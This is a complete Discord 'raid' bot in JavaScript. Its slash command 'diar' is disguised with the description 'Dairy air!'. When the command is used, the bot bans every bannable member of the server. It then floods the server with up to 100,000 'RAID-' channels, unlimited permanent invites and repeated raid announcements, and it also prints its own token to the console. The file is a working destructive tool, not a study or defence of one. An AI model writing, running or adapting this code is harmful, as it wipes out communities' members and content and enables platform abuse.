import { REST, Routes, Client, GatewayIntentBits, PermissionFlagsBits } from 'discord.js';

const TOKEN = process.argv[2]
const CLIENT_ID = process.argv[3]
const commands = [
  {
    name: 'diar',
    description: 'Dairy air!',
  },
];

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildInvites] });

const rest = new REST({ version: '10' }).setToken(TOKEN);

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

try {
  console.log('Started refreshing application (/) commands.');

  await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });

  console.log('Successfully reloaded application (/) commands.');
} catch (error) {
  console.error(error);
}

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

async function raidMain(guild, interaction) {
  console.log("MAIN RAN")

  console.log("RUN BAN LOOP")
  for (const member of guild.members.cache.values()) {
    try {
      if (member.bannable) {
        await member.ban({reason: "raided", deleteMessageSeconds: 0})
      }
    }catch{console.log("Error banning!")}
    await new Promise(r => setTimeout(r, randInt(100,420)));
  }

  console.log("DOING MAIN LOOP IN MAIN FUNC")
  for (let i = 0; i < 100000; i++) {
    let j = randInt(420,999999)
    console.log(`Creating channel RAID-${j}`)
    guild.channels.create({ name: `RAID-${j}`, reason: 'COOL CHANNEL IS COOL' })
    interaction.channel.createInvite({
        maxAge: 0, // Invite never expires (adjust as needed)
        maxUses: 0, // Unlimited uses (adjust as needed)
      })
    try {
        interaction.channel.send(`# RAID
            This is a raid! Everybody get down!
            
            ***This raid brought to you by [Sneed Group](https://github.com/sneed-group) and [NodeMixaholic.com!](https://nodemixaholic.com)***`)
    } catch {
        console.warn("Error sending raid msg! (Timeout?)")
    }
    await new Promise(r => setTimeout(r, randInt(500,6200)));
}
}

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'diar') {
    console.log("RAID STARTED.")

    let guild = interaction.guild
    raidMain(guild, interaction)

    interaction.reply("OK")
  }
});

console.log(`${TOKEN}`)
client.login(TOKEN);
